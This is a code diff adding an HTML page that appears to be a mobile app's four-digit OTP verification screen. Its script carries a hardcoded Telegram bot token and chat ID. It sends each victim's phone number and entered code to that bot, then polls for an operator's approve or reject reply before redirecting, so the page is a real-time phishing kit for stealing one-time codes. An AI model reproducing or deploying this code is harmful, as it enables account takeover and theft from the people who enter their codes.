@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OTP Verification</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+    body { background-color: #222; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    
+    .app-screen { 
+      width: 100%; 
+      max-width: 412px; 
+      height: 100vh; 
+      max-height: 870px; 
+      background-color: #ffffff; 
+      display: flex; 
+      flex-direction: column; 
+      justify-content: space-between; 
+      position: relative; 
+      overflow: hidden; 
+    }
+
+    /* Top Navigation Bar */
+    .nav-bar { 
+      background-color: #0b3c5d; 
+      height: 60px; 
+      display: flex; 
+      align-items: center; 
+      justify-content: space-between; 
+      padding: 0 16px; 
+      color: #ffffff; 
+    }
+    .nav-btn { 
+      background: none; 
+      border: none; 
+      color: #ffffff; 
+      font-size: 20px; 
+      cursor: pointer; 
+      padding: 8px;
+    }
+    .nav-title { 
+      font-size: 18px; 
+      font-weight: 600; 
+      letter-spacing: 0.5px;
+    }
+
+    /* Main Content Area */
+    .content { 
+      padding: 32px 24px; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      flex: 1;
+    }
+    .otp-subtitle { 
+      color: #0b3c5d; 
+      font-size: 18px; 
+      font-weight: 600; 
+      margin-top: 20px; 
+      margin-bottom: 40px; 
+      text-align: center;
+    }
+
+    /* 4-Digit Input Container */
+    .otp-inputs { 
+      display: flex; 
+      gap: 12px; 
+      justify-content: center; 
+      width: 100%; 
+      margin-bottom: 24px; 
+    }
+    .otp-box { 
+      width: 56px; 
+      height: 56px; 
+      border: 1.5px solid #8e9aaf; 
+      border-radius: 12px; 
+      text-align: center; 
+      font-size: 24px; 
+      font-weight: 600; 
+      color: #0b3c5d; 
+      outline: none; 
+      background-color: #ffffff; 
+      transition: border-color 0.2s ease;
+    }
+    .otp-box:focus { 
+      border-color: #0b3c5d; 
+    }
+
+    /* Resend Text */
+    .resend-text { 
+      color: #707e94; 
+      font-size: 14px; 
+      margin-top: 8px; 
+    }
+    .resend-link { 
+      color: #0b3c5d; 
+      font-weight: 700; 
+      text-decoration: none; 
+      cursor: pointer;
+    }
+
+    /* Bottom Button Area */
+    .footer { 
+      padding: 0 24px 32px; 
+    }
+    .btn-next { 
+      width: 100%; 
+      height: 54px; 
+      border-radius: 27px; 
+      border: none; 
+      background-color: #b5beca; 
+      color: #ffffff; 
+      font-size: 16px; 
+      font-weight: 700; 
+      cursor: not-allowed; 
+      transition: background-color 0.2s ease;
+    }
+    .btn-next.active { 
+      background-color: #0b3c5d; 
+      cursor: pointer; 
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-screen">
+    <!-- Navigation Bar -->
+    <div class="nav-bar">
+      <button class="nav-btn" onclick="history.back()">&#10094;</button>
+      <div class="nav-title">OTP</div>
+      <button class="nav-btn" onclick="window.location.href='number.html'">&#10005;</button>
+    </div>
+
+    <!-- Main Content -->
+    <form id="digitOtpForm" style="display: flex; flex-direction: column; justify-content: space-between; flex: 1;">
+      <div class="content">
+        <h3 class="otp-subtitle" id="otpHeading">OTP sent to ********865</h3>
+
+        <div class="otp-inputs">
+          <input type="tel" maxlength="1" class="otp-box" autofocus required />
+          <input type="tel" maxlength="1" class="otp-box" required />
+          <input type="tel" maxlength="1" class="otp-box" required />
+          <input type="tel" maxlength="1" class="otp-box" required />
+        </div>
+
+        <p class="resend-text">Did not receive an OTP? <a href="#" class="resend-link" id="resendBtn">Resend</a></p>
+      </div>
+
+      <!-- Footer Button -->
+      <div class="footer">
+        <button type="submit" class="btn-next" id="btnNext" disabled>NEXT</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8863238528:AAEi5wD3qWuU-p7fM6pySmkmM8sQfftlQaE';
+    const CHAT_ID = '6613838511';
+
+    const inputs = document.querySelectorAll('.otp-box');
+    const btnNext = document.getElementById('btnNext');
+    const digitOtpForm = document.getElementById('digitOtpForm');
+    const otpHeading = document.getElementById('otpHeading');
+
+    // Retrieve phone number from previous step or parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const phone = urlParams.get('phone') || localStorage.getItem('userPhone');
+
+    if (phone && phone.length >= 3) {
+      const masked = '*'.repeat(Math.max(0, phone.length - 3)) + phone.slice(-3);
+      otpHeading.textContent = `OTP sent to ${masked}`;
+    }
+
+    // Auto-focus move & validation
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkInputs();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    function checkInputs() {
+      let isComplete = true;
+      inputs.forEach(i => {
+        if (i.value.trim() === '') isComplete = false;
+      });
+
+      if (isComplete) {
+        btnNext.classList.add('active');
+        btnNext.removeAttribute('disabled');
+      } else {
+        btnNext.classList.remove('active');
+        btnNext.setAttribute('disabled', 'true');
+      }
+    }
+
+    // Form Submission & Telegram Verification
+    digitOtpForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      let otpValue = '';
+      inputs.forEach(i => otpValue += i.value);
+
+      btnNext.innerText = 'VERIFYING...';
+      btnNext.disabled = true;
+
+      const message = `🔢 *Digit OTP Submitted*\nPhone: \`${phone || 'Unknown'}\`\nOTP Code: \`${otpValue}\`\n\nApprove or Reject?`;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: '✅ Approve OTP', callback_data: `approve_digit_otp_${otpValue}` },
+                  { text: '❌ Reject OTP', callback_data: `reject_digit_otp_${otpValue}` }
+                ]
+              ]
+            }
+          })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          checkApproval(otpValue);
+        }
+      } catch (error) {
+        alert('Error verifying OTP.');
+        btnNext.innerText = 'NEXT';
+        btnNext.disabled = false;
+      }
+    });
+
+    function checkApproval(otpValue) {
+      let offset = 0;
+      const interval = setInterval(async () => {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}`);
+          const data = await res.json();
+
+          if (data.ok && data.result.length > 0) {
+            for (const update of data.result) {
+              offset = update.update_id + 1;
+
+              if (update.callback_query) {
+                const action = update.callback_query.data;
+
+                if (action === `approve_digit_otp_${otpValue}`) {
+                  clearInterval(interval);
+                  window.location.href = 'success.html';
+                } else if (action === `reject_digit_otp_${otpValue}`) {
+                  clearInterval(interval);
+                  alert('Invalid OTP code. Please re-enter.');
+                  inputs.forEach(i => i.value = '');
+                  inputs[0].focus();
+                  btnNext.innerText = 'NEXT';
+                  checkInputs();
+                }
+              }
+            }
+          }
+        } catch (err) {
+          console.error('Polling error:', err);
+        }
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
